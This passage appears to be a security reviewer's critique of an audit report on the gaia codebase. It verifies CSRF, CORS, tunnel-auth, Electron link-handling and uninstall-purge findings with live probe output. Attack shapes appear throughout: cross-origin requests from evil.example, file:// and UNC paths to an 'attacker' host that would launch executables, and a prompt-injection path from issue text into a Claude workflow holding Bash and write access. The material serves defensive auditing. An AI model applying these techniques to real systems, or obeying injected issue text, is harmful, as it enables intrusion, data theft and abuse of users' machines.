  - `gaia.sidecar.caller_auth` exists and the flagship is its only consumer
    (`src/gaia/sidecar/caller_auth.py:33`). Its public names are `config_from_env`, `get_config`,
    `is_exempt_path`, `token_ok`, `HostOriginMiddleware` — **there is no `require_caller_token`**.
  - `docs/sdk/infrastructure/api-server.mdx:25` — `uvicorn.run(app, host="0.0.0.0", port=8080)`. Exact.
  - `/v1/chat/completions` in `src/gaia/api/openai_server.py:248` has **no** auth dependency;
    `GAIA_API_KEY` gates only the relayed `/v1/<agent>/*` router (`:773-774`). Report correct.
- **REFUTED sub-claim:** "`src/gaia/api/openai_server.py:178` carries the same wildcard."
  It does not, out of the box. `_cors_config()` (`:158-189`, applied at `:192`) is **localhost-only by
  default**; `:154-155` defines `_LOCAL_ORIGIN_REGEX = r"^https?://(localhost|127\.0\.0\.1)(:\d+)?$"`.
  *Probe:*
  ```
  default   : {'allow_origins': [], 'allow_origin_regex': '^https?://(localhost|127\.0\.0\.1)(:\d+)?$',
               'allow_credentials': True, …}
  GAIA_API_CORS_ORIGINS='*' : {'allow_origins': ['*'], 'allow_credentials': False, …}
  ```
  Line `:178` is inside the `if "*" in origins:` branch, reachable only when an operator explicitly
  sets `GAIA_API_CORS_ORIGINS=*` — and that branch **disables credentials** and logs a warning. The
  docstring at `:158-168` says so and explains exactly the reflection risk I demonstrated above.
  **This is the code doing the right thing, and the report cites it as doing the wrong thing.** Remove
  the sentence, or replace it with: "`openai_server` gets this right (localhost-only by default,
  wildcard forced to `allow_credentials=False`) — `agents/base/server.py` is the outlier; port the
  former's `_cors_config` to the latter."
- **Required edit to REPORT.md:** the four line-number fixes above, the REFUTED sentence removed, and
  `require_caller_token` replaced with the names that exist (`HostOriginMiddleware` + a dependency
  built on `caller_auth.token_ok` / `is_exempt_path`). Also drop the implication that the
  `openai_server` CORS is a finding; keep the `/v1/chat/completions`-has-no-auth half, which stands.
- **Severity check:** keep 🔴 for the `AgentServer` half — no auth, Origin-reflecting credentialed
  CORS, and a route that starts multi-GB downloads, on a port every `--api` hub agent opens. The
  `openai_server` half drops to "no auth on `/v1/chat/completions`" only, which is 🟡-shaped on its own
  (loopback default + localhost-only CORS) but is legitimately folded into the 🔴 because CORS is not a
  defence against a non-browser caller or DNS rebinding, and the docs example binds `0.0.0.0`.
- **Fix check:** sound, but the cheapest correct fix is smaller than the report suggests — copy
  `openai_server._cors_config()` into `AgentServer.build_api_app` verbatim. That single change removes
  the Origin reflection, and it is a change the repo has already reviewed and shipped once.
  Adding `caller_auth` on top is the right second step, not the first.
- **Tracked check:** **#2951 is not "adjacent" — it names this exact line.** Its body reads
  "`src/gaia/agents/base/server.py:443` — same pattern", with a checklist item "Base agent server:
  same narrowing". Change "Tracked: #630 (API auth), #2951 (adjacent CORS)" to "Tracked: #2951 names
  `agents/base/server.py:443` directly (open, unfixed); #630 covers the API-key half."
  Worth flagging to the maintainer as part of the finding: **#2951's own risk assessment is wrong on
  two counts** — (i) it claims `TunnelAuthMiddleware (server.py:137-151)` mitigates the base agent
  server; at HEAD `TunnelAuthMiddleware` exists **only** in `src/gaia/ui/server.py:98` (grep over
  `src/` → one definition), and `agents/base/server.py:137-151` is `_default_model_id` /
  `_default_agent_id`; (ii) it claims browsers reject wildcard-plus-credentials outright, which my
  probe disproves — Starlette reflects the Origin. So the issue is filed at a lower priority than the
  code warrants.

---

### C9 CONFIRMED-ADJUST — the mechanism is right; **every number in the headline is wrong**

I enumerated the routes rather than counting decorators. `%TEMP%\critC\p_c9.py` / `p_c9b.py` build the
real app (`gaia.ui.server.create_app`), walk every `APIRoute` through FastAPI's lazy
`_IncludedRouter` wrappers, read each route's full dependant tree for `_require_ui_header`, and
classify each unguarded route's body as `none` / `form/file` / `json`.

```
mutating APIRoutes = 92     guarded by _require_ui_header = 24     unguarded = 68
   of the 68 unguarded:  41 CSRF-able (body-less, path/query-only, or multipart form)
                         27 JSON-body-gated
live check: POST /api/sessions  Content-Type: text/plain -> 422
            POST /api/chat/send Content-Type: text/plain -> 422
```

- **Required edit to REPORT.md — replace the headline.** "~28 of ~45 mutating routes … applied to 17
  routes only" becomes **"41 of 92 mutating routes are CSRF-able; the `X-Gaia-UI` guard is applied to
  24."** All three figures are off, and two of them understate the problem.
  (The report's "~28" matches the count with `/v1/email/*` excluded — but `email_sidecar_router` is
  included **unconditionally** at `src/gaia/ui/server.py:638-640`, so those 14 body-less email routes,
  including `POST /v1/email/send`, are in scope and are the most alarming entries on the list.)
- **Evidence — the guard.** `_require_ui_header` is defined four times
  (`connectors.py:106`, `agents.py:58`, `hub.py:53`, `memory.py:41`) and applied to exactly 24 routes:
  7 × `/api/agents/*` (hub.py `:167,231,253,283,341` + agents.py `:203,252`), 12 × `/api/connectors/*`,
  3 × `/api/memory/{all,reinitialize,settings}`, 2 × `/v1/connections/{provider}`.
  Its docstring (`connectors.py:106-113`) states the intent verbatim: "Custom request headers trigger a
  CORS preflight in browsers, so drive-by form POSTs from malicious pages cannot forge this header."
- **Evidence — the 41 CSRF-able routes** (full list in the probe output; the ones that matter):
  `POST /api/tunnel/start`, `POST /api/tunnel/stop`, `POST /api/documents/upload` (multipart),
  `POST /api/files/upload` (multipart), `POST /api/documents/{id}/reindex`,
  `DELETE /api/documents/{id}`, `POST /api/memory/prune`, `POST /api/memory/consolidate`,
  `DELETE /api/memory/knowledge/{id}`, `POST /api/memory/rebuild-{embeddings,fts}`,
  `DELETE /api/sessions/{id}`, `DELETE /api/sessions/{id}/messages/{id}/and-below`,
  `PATCH /api/sessions/{id}/private`, `DELETE /api/schedules/{name}`,
  `PUT /api/goals/{id}/{approve,reject,cancel}`, `POST /api/mcp/agent-server/stop`, and the whole
  `/v1/email/*` surface — `send`, `draft`, `archive`, `quarantine`, `triage`, `triage/batch`,
  `calendar/events`, `confirm`, `init`, `prescan`, `search`, `unarchive`, `unquarantine`.
  **`POST /api/mcp/agent-server/start` is on the JSON-gated side, not the CSRF-able side** — the report
  lists it as an unguarded example; move it (or drop it).
- **Live proof, and a warning.** Posting to `POST /api/tunnel/start` from the probe returned **200 and
  actually started a public ngrok tunnel** (`https://<redacted>.ngrok-free.dev`, token in the body).
  I killed the `ngrok.exe` it spawned immediately (`taskkill /F /IM ngrok.exe` → SUCCESS; re-checked
  clear). That is the single most convincing artifact available for C9 and the report should say so:
  *one body-less cross-origin POST publishes the user's Agent UI to the internet.* It also
  incidentally demonstrates C10's precondition — the very next request in the same probe,
  `POST /api/memory/prune`, came back `401 {"detail":"Missing or invalid Authorization header"}`,
  i.e. `TunnelAuthMiddleware` switched on only *after* `tunnel.active` flipped.
- **Evidence — the rest of the claims, all confirmed.**
  `grep -rn "TrustedHost|allowed_hosts" src/gaia/ui src/gaia/daemon src/gaia/api` → **0**.
  `GET /api/files/preview` exists (`src/gaia/ui/routers/files.py:508`), so the read-side DNS-rebinding
  point stands. "Pydantic-JSON-body routes are safe (422 on `text/plain`)" — verified live above, and
  the mechanism is right: a cross-site form/`fetch` can only send a simple content type without a
  preflight, and FastAPI 422s before the handler runs.
- **Severity check:** keep 🔴, and it is stronger than the report argues. Remotely reachable from any
  page the user visits, no click beyond visiting, and the reachable set includes "send email as the
  user" and "publish this machine's Agent UI to the internet".
- **Fix check:** the proposed middleware-level enforcement is right, with three refinements the report
  should carry: (1) the exemption list is bigger than "the OAuth loopback callback GET" — check the
  `/v1/email/*` surface, which is a *relay* to a sidecar and may have non-browser callers; (2) the
  header check must run **before** `TunnelAuthMiddleware`'s `tunnel.active` shortcut, or C10's window
  re-opens it; (3) the route-table introspection test is the highest-value item in the whole fix and
  should be named as the deliverable — `p_c9b.py`'s walk (handling FastAPI's lazy `_IncludedRouter`)
  is a working starting point, and a naive `for r in app.routes` finds **zero** routes on this FastAPI
  version, which is exactly how a test like this silently passes while asserting nothing.
- **Tracked check:** none found (`--search "CSRF X-Gaia-UI"`, `--search "agent ui csrf"` → 0). #2951 is
  about CORS on two other servers, not this.

---

### C10 OVERSTATED (mechanism CONFIRMED; the exploit path is not reachable in any shipped configuration)

- **Evidence — the mechanism is exactly as described.**
  - `src/gaia/ui/server.py:123-125` — `tunnel = getattr(request.app.state, "tunnel", None)` /
    `if tunnel is None or not tunnel.active: return await call_next(request)`. Report cites
    `:112-115`; the block is `:122-125` (`TunnelAuthMiddleware` class opens at `:98`).
  - `src/gaia/ui/tunnel.py:303-309` — `active` requires `_process is not None and
    _process.poll() is None and _url is not None`. Report's `:301-308` is one line early.
  - `tunnel.py:394` `self._token = str(uuid.uuid4())` — minted **before** `Popen` at `:411-416`,
    so the report's proposed gate ("`_token` is minted before `Popen`") is implementable as stated.
  - `tunnel.py:420` `self._url = await self._poll_ngrok_api()`; `_poll_ngrok_api` is at `:589-591`
    with `timeout=15.0, interval=0.5`, and `:606-608` sleeps *first* then polls, so `_url` is None
    for at least 0.5 s of every successful start. Report cites `:407-417` — that range covers the
    `Popen`; the polling loop is `:589-608` and the call is `:420`.
  - On timeout the code does `await self.stop()` (`:447`), so the window is bounded at 15 s. The
    report's "for the full 15 s when a start times out" is right — it is not indefinite.
  - *Incidental live confirmation.* While probing C9 I started a real tunnel through
    `POST /api/tunnel/start`; the very next request in the same process,
    `POST /api/memory/prune`, came back `401 {"detail":"Missing or invalid Authorization header"}`.
    So the middleware genuinely switches on only when `tunnel.active` flips — the fail-open path is
    real. (The ngrok process was killed immediately: `taskkill /F /IM ngrok.exe` → SUCCESS, re-checked clear.)
- **Why OVERSTATED:** the finding's exploitability rests on "With a fixed `--domain`, the hostname is
  known to an attacker." **No code path ever passes a domain.** `TunnelManager.__init__` takes
  `domain: Optional[str] = None` (`tunnel.py:286`), and the only construction in the product is
  `src/gaia/ui/server.py:576` — `TunnelManager(port=DEFAULT_PORT)`, no `domain=`. Grep across `src/`
  finds no `GAIA_TUNNEL_DOMAIN`, no `--tunnel-domain` CLI flag, and no other `TunnelManager(`
  besides a docstring example (`tunnel.py:279`). So ngrok always gets a random `*.ngrok-free.dev`
  subdomain that nobody can know during the 0.5–15 s window in which it is unauthenticated. The
  window is unreachable without already knowing the URL, and the only party who learns it is the user
  reading the QR code after the poll returns.
- **Required edit to REPORT.md:**
  1. Delete "With a fixed `--domain`, the hostname is known to an attacker" and replace with:
     "No shipped code path passes `domain=` (`ui/server.py:576` constructs `TunnelManager(port=...)`
     only), so the public hostname is a random ngrok subdomain that nobody can predict during the
     window. This is a fail-open defect, not a reachable attack — it becomes reachable the moment a
     custom domain is wired up, which the `domain` parameter exists to allow."
  2. Fix the four line citations above.
- **Severity check:** **change 🔴 → 🟡.** Per `REVIEW.md`, 🔴 is "a bug that will fire in normal use"
  or an exploitable security issue; this is "a real bug in an edge path" — the definition of 🟡. The
  gate keys on the wrong condition and fails open, which is worth fixing exactly as proposed, but
  publishing it in the 🔴 list alongside C9 (remotely reachable, one page visit) misrepresents its
  reachability and dilutes the list. Keep the 🔒 marker.
- **Fix check:** correct and small. "Gate on 'process spawned and not stopped'" works because `_token`
  is set at `:394` before `Popen` at `:411`. Two details to add: (a) `verify_token` (`:344`) *also*
  short-circuits on `not self.active`, so it must be changed in the same commit or the new gate will
  reject every request during the window instead of authenticating it; (b) the proposed test should
  assert the 401, not just the middleware being reached.
- **Tracked check:** none found (`--search "tunnel auth window"`, `--search "TunnelAuthMiddleware"` → 0).

---

### C11 CONFIRMED

- **Evidence:**
  - `src/gaia/mcp/mcp_bridge.py:436-443` `do_OPTIONS` → `Access-Control-Allow-Origin: *`,
    `Access-Control-Allow-Headers: Authorization, Content-Type`. Exact.
  - `:453` — `self.send_header("Access-Control-Allow-Origin", "*")` inside `send_json`, i.e. on
    **every data response**, not just preflight. Exact.
  - `:505` — `auth_token = auth_token or os.environ.get(AUTH_TOKEN_ENV_VAR) or None`, and
    `:538` prints `Auth: ⚠️  none - every endpoint is open to any client that can reach it`.
    Both exact; the default really is unauthenticated and the code says so out loud.
  - Shared conversation confirmed: `chat_sdk` is an attribute of **`GAIAMCPBridge`** (declared
    `:65`/`:67`, class at `:47`), lazily built once at `:173-176` and reused at `:182`. One
    `AgentSDK`, one conversation, shared by every caller for the life of the process. Report's
    `:173-182` exact.
  - The pinning test is `test_cors_preflight_stays_open_and_allows_authorization` at
    `tests/unit/test_mcp_bridge_auth.py:227` — exact, and its docstring ("Browsers never send
    Authorization on preflight") shows the open preflight is deliberate.
  - *Live probe re-run* (`%TEMP%\critC\p_c11.py` — real `HTTPServer` + `MCPHTTPHandler` on
    127.0.0.1:8477, unauthenticated, shut down at the end):
    ```
    OPTIONS /chat   Origin: http://evil.example -> 200  ACAO='*'  ACAH='Authorization, Content-Type'
    GET     /health Origin: http://evil.example -> 200  ACAO='*'
            body: {"status":"healthy","service":"GAIA MCP Bridge (HTTP)","agents":2,"tools":2}
    GET     /status Origin: http://evil.example -> 200  ACAO='*'
            body: {…,"host":"localhost","port":8477,"llm_backend":"http://localhost:13305/api/v1",…}
    ```
    Reproduces the report's probe and extends it: the `*` is on **data** responses too, so a hostile
    page can read the reply, not merely fire the request.
- **Required edit to REPORT.md:** none required. One clause worth pre-empting a dismissal:
  `resolve_bind_host` (`:468-495`) does keep an unauthenticated bridge on loopback unless the user
  explicitly passes `0.0.0.0`, and it warns when they do — but **loopback is not a mitigation for
  this finding**, because the attacker is a page in the user's own browser reaching
  `http://localhost:<port>`, and `ACAO: *` is precisely what lets it read the answer. Say that, or a
  triager will close it as "localhost-only".
- **Severity check:** keep 🔴. Remotely reachable (any visited page), no click, and it exposes both
  the tool surface and one shared conversation that may contain the user's RAG context.
- **Fix check:** all four items are right. Note the ordering constraint: flipping
  `test_mcp_bridge_auth.py:227` is not optional cleanup — it is the assertion that currently *requires*
  the hole, so it has to change in the same commit or CI blocks the fix. Also `ACAH: Authorization`
  should go with `ACAO`; leaving it while narrowing the origin is harmless but leaving the origin
  while narrowing headers achieves nothing.
- **Tracked check:** none for the bridge (`--search "mcp bridge CORS"` → 0). #2951 covers the CORS of
  two *other* servers (EMR dashboard, `agents/base/server.py`) and does not mention the bridge —
  "Tracked: #2951 (adjacent), none for the bridge" is accurate as written.

---

### C12 CONFIRMED — and the report's own hedge can be dropped

The brief asked me to settle the URL-resolution question. **It resolves exactly as the report claims**,
verified against ada (the WHATWG implementation Chromium and Node share):

```
node -e "new URL(u, 'file:///C:/Users/me/AppData/Local/gaia/webui/index.html')"
  "/Windows/System32/calc.exe"          -> file:///C:/Windows/System32/calc.exe
  "//attacker/share/x.exe"              -> file://attacker/share/x.exe
  "\\attacker\share\x.exe"              -> file://attacker/share/x.exe      <- NOT in the report
  "/./../../Windows/System32/calc.exe"  -> file:///C:/Windows/System32/calc.exe
  "#frag"                               -> file:///C:/.../index.html#frag
node v22.18.0
```

This is the WHATWG "file slash state" rule: a leading `/` against a `file:` base re-attaches the
base's normalized Windows drive letter (`C:`), and `//host/…` goes to "file host state" and becomes a
UNC authority. Neither is speculative.

- **Evidence — the code path.**
  - `src/gaia/apps/webui/main.cjs:515-518` — `mainWindow.webContents.setWindowOpenHandler(({ url }) =>
    { shell.openExternal(url); return { action: "deny" }; })`. No scheme check. Exact.
  - **No `will-navigate` handler exists**: grep for `will-navigate|setWindowOpenHandler|openExternal`
    over `main.cjs` returns only `:515` and `:516`. Exact.
  - Window is loaded from `file://`: `:569-571` `const fileUrl = pathToFileURL(indexPath); …
    await mainWindow.loadURL(fileUrl.href)`. Exact.
  - `src/gaia/apps/webui/src/utils/markdown.ts:52` —
    `if (url.startsWith('#') || url.startsWith('/')) return url;` and `:56` —
    `if (colonIdx === -1) return url; // relative URL`. **Both cited lines exact.** The docstring
    directly above (`:44-46`) asserts the false invariant in so many words: "Relative URLs (no scheme)
    and fragment-only URLs (`#anchor`) pass through unchanged — **they cannot navigate cross-origin**."
  - It is wired in: `MessageBubble.tsx:7` imports `safeUrlTransform`, `:626` passes
    `urlTransform={safeUrlTransform}`; every link is `target="_blank"` at `:676-687`. All exact.
  - **A third bypass shape the report misses:** the backslash UNC form `\\attacker\share\x.exe`
    passes `safeUrlTransform` through the `colonIdx === -1` branch at `:56` (it starts with `\`, not
    `/`, so `:52` never sees it) and resolves to the same `file://attacker/share/x.exe`. Worth adding
    — a fix that only guards `startsWith('/')` will miss it.
  - *OS half proven, nothing executed.* `ShellExecuteW(nullptr, "open", <url>, …)` — the call Electron's
    `shell.openExternal` reaches on Windows — was probed with **non-existent** targets
    (`%TEMP%\critC\p_c12b.py`):
    ```
    file:///C:/Windows/System32/zzz-not-a-real-binary.exe -> 2   SE_ERR_FILENOTFOUND
    file:///C:/zzz-not-a-real-dir/zzz.exe                 -> 2   SE_ERR_FILENOTFOUND
    file://attacker-host-that-does-not-exist/share/zzz.exe-> 2   SE_ERR_FILENOTFOUND
    gaiazzz://not-a-registered-scheme/x                   -> 42  (handled, >32)
    ```
    `SE_ERR_FILENOTFOUND` rather than `SE_ERR_NOASSOC` proves the shell **parsed the `file:` URL into
    a filesystem path** and failed only because nothing is there — i.e. an existing `.exe` would have
    been launched. No binary was run.
- **The one residual gap — state it, do not hide it.** Whether Electron 44's own `shell.openExternal`
  filters the `file:` scheme *before* reaching `ShellExecuteW` could not be tested here: no Electron
  binary is installed (`src/gaia/apps/webui/node_modules/electron/dist/electron.exe` → absent), and
  `package.json:73` pins `"electron": "^44.0.0"`. Everything on either side of that one call is
  proven. Settling it needs one `npm i && npx electron` run in a scratch checkout with a
  `setWindowOpenHandler` that logs the resolved URL and calls `openExternal` on a benign
  `file:///…/probe.txt`.
- **Required edit to REPORT.md:**
  1. Change "Confidence High (Medium on exact WHATWG `/…` resolution)" to
     "Confidence High (verified against ada/WHATWG; the one untested link is whether Electron 44's
     `openExternal` itself filters `file:` before `ShellExecuteW`)". The hedge is on the wrong clause.
  2. Add the `\\host\share\x.exe` backslash form to the bypass list and to the fix
     ("keep only `#` fragments" already covers it, but the reader needs to know it exists).
- **Severity check:** keep 🔴. Attacker position is correctly stated and worth restating in the report:
  **prompt-injected model output plus one user click** on a rendered link. Not drive-by.
- **Fix check:** correct and complete as written — allow-list `http:`/`https:`/`mailto:` in `main.cjs`,
  add `will-navigate` prevention, and restrict chat-content links to `#` fragments. Add one line: the
  scheme check must run on the **resolved** URL Electron hands the handler, not on the raw `href`,
  since resolution is what turns `/x` into `file:///C:/x`.
- **Tracked check:** none found (`--search "openExternal"`, `--search "electron shell openExternal"` → 0).
  #976 (the markdown hardening the report references) is the right ancestor to cite.

---

### C13 CONFIRMED

- **Evidence:**
  - `src/gaia/apps/webui/src/stores/notificationStore.ts:22`
    `export const ALWAYS_ALLOW_TOOLS_KEY = 'gaia_always_allow_tools';` — exact.
  - `:109-117` — `if (action === 'allow' && remember) { … existing.push(notification.tool);
    localStorage.setItem(ALWAYS_ALLOW_TOOLS_KEY, JSON.stringify(existing)); }`. Keyed by **tool name
    only**, no arguments, no scope, no expiry. Exact.
  - `ChatView.tsx:791-802` (`tool_confirm` branch) — reads the list and calls
    `api.confirmToolExecution(sessionId, event.confirm_id, 'allow', false)`; the 4th argument is
    `remember=false`, so the backend records a one-off explicit allow and never learns a standing
    grant exists. Report cites `:791-800`; the branch runs to `:802`.
  - `ChatView.tsx:824-833` (`permission_request` branch) — the same read and
    `api.confirmTool(sessionId, true)`. Report cites `:825-834`; it is `:824-833`.
  - **No revocation surface.** `ALWAYS_ALLOW_TOOLS_KEY` / `gaia_always_allow_tools` appears at exactly
    5 sites in the whole frontend: the declaration, the one `setItem`, and three `getItem`s. Nothing
    ever removes an entry and no Settings component references it.
  - The TUI contrast is real: `tui/internal/ui/components/confirmation.go:338-348` —
    `allowAlways()` returns `m.deliverable && m.alwaysScope != ""`, with the comment "The client never
    invents that scope: an 'always' the renderer decided the shape of would be a promise nothing
    enforces." Exact, and it is the precise inverse of what the web UI does.
- **Required edit to REPORT.md:** two off-by-one line ranges (`:791-802`, `:824-833`). Nothing else.
- **Severity check:** keep 🔴. `run_shell_command` is in `TOOLS_REQUIRING_CONFIRMATION` — it is the
  headline gate for C4's shell surface — and one tick permanently removes it for every future session
  in that browser profile, including every bypass in C4. Two findings compose here and the report
  should cross-reference: C13 is the switch that turns C4 from "user sees and approves the raw
  command" into "nobody is asked", which is exactly the precondition C4's last sentence names.
- **Fix check:** right, and the TUI already has the model to copy (`alwaysScope` supplied by the
  agent, refused when absent). One addition: shipping the fix must also **clear or ignore existing
  `gaia_always_allow_tools` entries** on upgrade, or every profile that already ticked the box keeps
  its standing grant with no way to see it.
- **Tracked check:** none found (`--search "always allow tool localStorage"` → 0).

---

### C14 CONFIRMED-ADJUST — facts right, severity and the "stale header" framing both need fixing

- **Evidence — every citation checks out.**
  - `.github/workflows/claude.yml:1028` `auto-fix:`; `:1032-1037` the trigger
    (`issues` + `opened|reopened|labeled(bug)` + `contains(labels, 'bug')`); `:1039-1042`
    `permissions: contents: write / issues: write / pull-requests: write`. Report's `:1032-1042` exact.
  - `:1075` `allowed_non_write_users: "*"` — exact.
  - `:1349` `--allowedTools Edit,Read,Write,Grep,Glob,Bash` — exact.
  - `.github/ISSUE_TEMPLATE/bug_report.yaml:7` `labels: ['bug', 'triage']` — exact, so filing through
    the template is itself the trigger. Report correct.
  - `:1057-1062` the job also runs `curl -LsSf https://astral.sh/uv/install.sh | sh` and
    `uv pip install --system -e ".[api]"` before Claude starts.
- **REFRAME the "stale header" claim.** `:76-80` ("Claude only reads code and posts comments (no code
  execution)") is explicitly scoped to the **`pull_request_target`** jobs — the sentence above it reads
  "SECURITY: pull_request_target runs with base repo permissions … This is SAFE here because:".
  `auto-fix` runs on `issues`, not `pull_request_target`, so calling that line stale is not quite fair.
  The sharper and defensible criticisms, which the report should say instead:
  1. The header's `allowed_non_write_users: "*"` risk-acceptance paragraph (`:84-94`) names
     **"pr-review and issue-handler"** and omits `auto-fix` — the job with strictly more privilege
     (`contents: write`, `Write`/`Edit` tools). A reader auditing the header's accepted-risk list will
     not find the worst job on it.
  2. `:82` says "IMPORTANT: Never add steps that execute code from the PR (npm install, pip install,
     make, etc.)", and `auto-fix` at `:1057-1062` does exactly `pip install` (of the base repo, so it
     is not a violation in substance — but the file's own stated invariant now needs a carve-out that
     is not written down).
  The report already concedes "the risk is documented and accepted in-file"; it should point at
  `:1012-1023`, which is where that acceptance actually lives and is notably thorough (it names the
  injection-via-issue-text → Bash → exfiltration path explicitly).
- **Branch protection: re-checked with the available token; still UNVERIFIABLE, and now I can say why.**
  ```
  gh auth status        -> account kovtcharov, scopes: gist, read:org, repo, workflow
  gh api repos/amd/gaia --jq .permissions
                        -> {"admin":false,"maintain":false,"push":false,"pull":true,"triage":false}
  gh api repos/amd/gaia/branches/main/protection  -> 404 Not Found
  gh api repos/amd/gaia/rules/branches/main       -> []
  gh api repos/amd/gaia/rulesets                  -> one ruleset, "Copilot review for default branch",
                                                     enforcement: "disabled"
  ```
  `GET /repos/{o}/{r}/branches/{b}/protection` **requires admin**, and this token has `pull` only —
  so the 404 is the documented response for insufficient permission, **not** evidence that protection
  is absent. `rules/branches/main` reports *rulesets* only and legitimately returns `[]` when
  protection is configured the classic way. So: the bound at `:1022` ("bounded by branch protection on
  main") is neither confirmed nor refuted, and cannot be from a read token. The report's Appendix-D
  hedge is correct; it should carry this explanation so nobody re-runs the same three calls.
- **Required edit to REPORT.md:** replace the "The file header (`:76-80`) still asserts 'no code
  execution'" sentence with points 1–2 above; add the token-permission explanation to the
  branch-protection clause (and to Appendix D); cite `:1012-1023` as the acceptance.
- **Severity check:** **change 🔴 → 🟡.** The exposure is real and correctly described, but it is a
  posture the maintainer documented and explicitly accepted in the file itself, with the injection
  path named. The only *new* information the finding adds is that one stated bound is unverified —
  and my re-check shows it is unverifiable from outside, not absent. Under `REVIEW.md`, a 🔴 is for a
  security issue or a bug that fires in normal use; an accepted, documented risk whose mitigation
  could not be checked is 🟡. Keep 🔒 and keep it prominent, but do not seat it in the critical list
  next to C9/C11 — that costs the list credibility. **Add one concrete ask** that turns it actionable:
  "a maintainer should run `gh api repos/amd/gaia/branches/main/protection` with an admin token and
  paste the result on the issue; if it 404s there too, C14 is 🔴."
- **Fix check:** the three fix items are all reasonable, and "gate `auto-fix` on a maintainer-applied
  label" is the highest-value one — it removes `allowed_non_write_users: "*"` from the equation for
  the write-capable job while leaving the fork-review jobs untouched. Note it conflicts with the
  workflow's stated design goal at `:1029-1031` (fire on `opened` so no maintainer has to babysit),
  so the report should acknowledge it is a deliberate trade, not an oversight. Dropping `Bash`
  entirely is not viable — the job's prompt (`:1223`) runs lint and tests — so
  `Bash(pytest:*),Bash(git diff:*)` (already the report's fallback) is the realistic form.
- **Tracked check:** none found (`--search "auto-fix workflow bash"`, `--search "claude.yml allowed_non_write_users"` → 0).

---

### C15 CONFIRMED

- **Evidence:**
  - `src/gaia/installer/uninstall_command.py:93-95` — `env_override = os.environ.get("GAIA_HOME")` /
    `if env_override: return Path(env_override).expanduser().resolve()`. Report cites `:94-96`; it is
    `:93-95`.
  - `_purge_paths` `:154-164` — the list is literally `gaia/"venv"`, `gaia/"chat"`,
    `gaia/"documents"`, plus four files. Cited range exact.
  - `_safe_roots` `:166-178` returns `[_gaia_home(home), _lemonade_models_dir(home),
    _huggingface_cache_dir(home)]` — so when `GAIA_HOME` **is** `$HOME`, the allowed root is `$HOME`
    and the containment guard at `:445-473` is vacuous by construction. Report cites `:449-471`; the
    guard block is `:445-473`.
  - `GAIA_HOME` really is the state root elsewhere: `src/gaia/security.py:89`
    (`for env_var in ("GAIA_CONFIG_DIR", "GAIA_HOME")`) and
    `src/gaia/llm/lemonade_embedded.py:144` (`override = os.environ.get("GAIA_HOME")`). Both exact.
  - *Probe re-run* (`%TEMP%\critC\p_c15.py`, `GAIA_HOME=<fakehome>` containing a real `Documents/`
    with a file in it):
    ```
    _gaia_home()  = …\fakehome
    _safe_roots() = [ …\fakehome , …\lemonade\models , …\huggingface\hub ]
    …\fakehome\venv       exists=True  inside_safe_roots=True
    …\fakehome\documents  exists=True  resolves_to=…\fakehome\Documents  inside_safe_roots=True
    listing …\fakehome\documents -> [ …\documents\thesis.docx ]
    ```
    Every element of the report's claim reproduces: `$HOME/venv` and `$HOME/documents` are on the
    purge list, `documents` resolves case-insensitively onto the real `Documents`, and the containment
    guard passes.
- **Required edit to REPORT.md:** the three off-by-a-few line citations above. Nothing substantive.
- **Severity check:** keep 🔴 with the existing "(Medium on prevalence)" caveat, which is the honest
  part and must stay. This is data loss, not security — the report has it correctly filed under
  §2.2 rather than §2.1. Attacker position: none; it needs the user to have set `GAIA_HOME` to their
  home directory (or any directory holding their own data) and then run `gaia uninstall --purge`.
  The report never claims otherwise, but adding "Attacker position: none — user misconfiguration"
  keeps §2.2 unambiguous.
- **Fix check:** all three fix items are right and the third is the cheapest real safety net. Two
  additions worth naming: (a) `--purge` **is** already gated by an interactive confirmation
  (`:795 if not _confirm(...)`) and refuses non-interactive purge without `--yes` (`:759-766`), so
  the fix is about *what the prompt shows*, not about adding a prompt — say so, or a reader will
  think there is no confirmation at all; (b) the "require a GAIA marker (`config.json`)" check is the
  strongest of the three because it is the only one that also catches `GAIA_HOME=D:\` or
  `GAIA_HOME=<some project dir>`, which the home-directory check alone would miss.
- **Tracked check:** none found (`--search "GAIA_HOME uninstall purge"`, `--search "uninstall purge documents"` → 0).

---

## Missed

### M-A 🔴 The Agent UI trusts **every** `*.ngrok-free.app` and `*.use.devtunnels.ms` origin with credentials — anyone can rent one, and it defeats the `X-Gaia-UI` guard C9 is about. The report clears this in Appendix C on reasoning that does not hold.

- **Where:** `src/gaia/ui/server.py:549-563`, specifically
  `allow_origin_regex=r"https://[a-zA-Z0-9-]+\.(ngrok-free\.app|use\.devtunnels\.ms)"` (`:559`)
  with `allow_credentials=True` (`:560`) and `allow_headers=["*"]` (`:562`).
- **Why it is a hole:** `*.ngrok-free.app` and `*.use.devtunnels.ms` are **shared, self-service**
  namespaces. Any attacker signs up for a free ngrok account (or a Microsoft dev tunnel), serves a
  page from their own subdomain, and now holds an origin this backend trusts. Because
  `allow_headers=["*"]`, their preflight is approved **including `X-Gaia-UI`** — which is the entire
  basis of the CSRF guard in C9. So the attacker reaches not just the 41 unguarded routes but the 24
  *guarded* ones too, and can **read** every response, including `GET /api/files/preview?path=…`
  (`src/gaia/ui/routers/files.py:508`).
- **Probe** (`%TEMP%\critC\p_miss1.py`, the exact middleware config from `:549-563`, starlette 1.6.0):
  ```
  PREFLIGHT https://attacker-owned.ngrok-free.app -> 200 ACAO=https://attacker-owned.ngrok-free.app
                                                        ACAC=true ACAH=x-gaia-ui,content-type
     GET /api/files/preview read-back             -> 200 ACAO=https://attacker-owned.ngrok-free.app ACAC=true
  PREFLIGHT https://attacker.use.devtunnels.ms    -> 200 ACAO=https://attacker.use.devtunnels.ms
                                                        ACAC=true ACAH=x-gaia-ui,content-type
  PREFLIGHT https://x.ngrok-free.app.evil.com     -> 400 (regex IS full-matched — that half is fine)
  PREFLIGHT http://evil.example                   -> 400
  ```
- **This contradicts the report's own Appendix C.** `.review/REPORT.md:504` lists
  "`allow_origin_regex` full-matched and ngrok domains on the PSL" under *checked and fine*, and
  `.review/03-servers-security.md:463` gives the reasoning: "ngrok domains are on the Public Suffix
  List, so the `*.ngrok-free.app` CORS allowance plus `SameSite=Strict` does not let another ngrok
  tenant ride the cookie." **PSL + `SameSite=Strict` protect the cookie; they do not protect the
  API.** The attacker does not need the cookie: `TunnelAuthMiddleware` passes every request through
  when the tunnel is not active (`ui/server.py:123-125`), so the backend is unauthenticated and a
  plain cross-origin `fetch` is enough. The allowed origin is what buys the preflight and the
  read-back. **Move this out of Appendix C.**
- **The allowance is also dead config.** The tunnel this repo starts issues `*.ngrok-free.**dev**`
